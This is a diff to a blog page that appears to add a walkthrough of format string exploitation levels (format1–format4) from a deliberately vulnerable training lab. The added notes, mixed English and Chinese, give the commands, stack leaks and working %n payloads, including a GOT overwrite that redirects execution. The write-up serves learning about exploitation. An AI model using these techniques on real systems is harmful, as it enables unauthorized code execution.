@@ -117,7 +117,7 @@
 
       <div class="read-time">
         <small>
-          4 minute read
+          5 minute read
         </small>
       </div>
 
@@ -414,6 +414,111 @@ link knowledge:
 
 <h4 id="x08-format1">0x08 format1</h4>
 <div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    objdump -t format1
+    find target address:0x8049638
+    ./format1 `python -c "print 'AAAABBBB'+'%x.%x'"`
+    -------------output:--------------
+    AAAABBBB804960c.bffff788
+    --------------end-----------------
+    ./format1 `python -c "print 'AAAABBBB'+'%2\$x'"`
+    ----------------output:----------------
+    AAAABBBB
+    ------------------end------------------
+    结论:这里不能用\$
+    ./format1 `python -c "print 'AAAABBBB'+'%x.'*140"`
+    ---------------output:----------------
+    AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7be.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.d5f4313f.ffa7a72f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b4.bffff7be.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.d3000000.e844f82d.2820150f.79187f9d.69c015e8.363836.0.6f662f2e.74616d72.41410031.42424141.78254242.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+    ------------------end-----------------
+    find 42424141 in the 132th print location
+    -----------------output:----------------
+    AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7bb.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.b3c0b28e.9993249e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b1.bffff7bb.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.84000000.a999d71b.1ef8a615.f39ada32.69642dc2.363836.662f2e00.616d726f.41003174.42414141.25424242.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
+    --------------------end-----------------
+    find 42414141 in the 131th print location
+    结论:AAAABBBB的在栈中出现的位置会随着输入的长度不同而变化
+    根据./format1 `python -c "print 'AAAABBBB'+'%x.'*140"`中132个输出为42424141:
+    ./format1 `python -c "print 'AA\x38\x96\x04\x08BB'+'%x.'*131+'%n.'+'%x.'*8"`
+    output:
+    .....you have modified the target :)
+</code></pre>
+</div>
+
+<h4 id="x09-format2">0x09 format2</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    objdump -t format2
+    find target address:80496e4
+    python -c "print '%x.'*2" | ./format2
+    --------output:---------
+    200.b7fd8420.
+    ---------end------------
+    python -c "print '%2\$x.'" | ./format2
+    ------------output:-----------
+    b7fd8420.
+    -------------end--------------
+    结论:支持\$
+    python -c "print 'AAAABBBB'+'%x.'*10" | ./format2
+    ---------output:----------
+    AAAABBBB200.b7fd8420.bffff5c4.41414141.42424242.252e7825.78252e78.2e78252e.252e7825.78252e78.
+    -----------end------------
+    python -c "print '\xe4\x96\x04\x08BBBB%56x'+'%4\$n'" | ./format2
+    output:
+    you have modified the target :)
+</code></pre>
+</div>
+
+<h4 id="xa-format3">0xA format3</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    objdump -t format3
+    find target address:80496f4
+    python -c "print 'AAAABBBB'+'%x.'*2" | ./format3
+    --------output:---------
+    AAAABBBB0.bffff580.
+    ------------end---------
+    python -c "print 'AAAABBBB'+'%2\$x'" | ./format3
+    --------output:--------
+    AAAABBBBbffff580
+    ----------end----------
+    结论:支持\$
+    python -c "print 'AAAABBBB'+'%x.'*13" | ./format3
+    ---------output:--------
+    AAAABBBB0.bffff580.b7fd7ff4.0.0.bffff788.804849d.bffff580.200.b7fd8420.bffff5c4.41414141.42424242.
+    -----------end----------
+    python -c "print '\xf4\x96\x04\x08BBBB%16930108x'+'%12\$n'" | ./format
+    output:
+    ...you have modified the target:)
+</code></pre>
+</div>
+
+<h4 id="xb-format4">0xB format4</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    gdb查找函数hello的地址(gdb找函数地址好像是不会变的,动态调试中的参数变量似乎会改变)
+    gdb format4
+    disas hello
+    output:
+    0x080484b4 &lt;hello+0&gt;:   push   %ebp
+    查找exit()在GOT表中的位置
+    objdump -TR format4
+    ---------output:----------
+    DYNAMIC RELOCATION RECORDS
+    OFFSET   TYPE              VALUE 
+    080496fc R_386_GLOB_DAT    __gmon_start__
+    08049730 R_386_COPY        stdin
+    0804970c R_386_JUMP_SLOT   __gmon_start__
+    08049710 R_386_JUMP_SLOT   fgets
+    08049714 R_386_JUMP_SLOT   __libc_start_main
+    08049718 R_386_JUMP_SLOT   _exit
+    0804971c R_386_JUMP_SLOT   printf
+    08049720 R_386_JUMP_SLOT   puts
+    08049724 R_386_JUMP_SLOT   exit
+    -----------end------------
+    find exit address is saved in 08049724,that is:exit_address=[08049724]
+    尝试在0x08049724中写入0x080484b4
+    python -c "print 'AAAABBBB'+'%x.'*10" | ./format4
+    -----------output:------------
+    AAAABBBB200.b7fd8420.bffff5c4.41414141.42424242.252e7825.78252e78.2e78252e.252e7825.78252e78.
+    -------------end--------------
+    python -c "print '\x24\x97\x04\x08BBBB%134513836x'+'%4\$n.'" | ./format4
+    output:
+    ...code execution redirected! you win
 </code></pre>
 </div>
 
